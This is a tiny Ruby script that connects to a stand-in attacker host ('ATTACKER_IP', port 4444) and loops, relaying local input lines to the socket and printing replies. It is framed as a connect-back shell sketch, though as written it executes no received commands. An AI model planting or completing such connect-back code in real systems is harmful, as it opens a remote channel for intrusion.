require 'socket'

s = TCPSocket.open("ATTACKER_IP", 4444)
loop do
  s.puts gets
  puts s.gets
end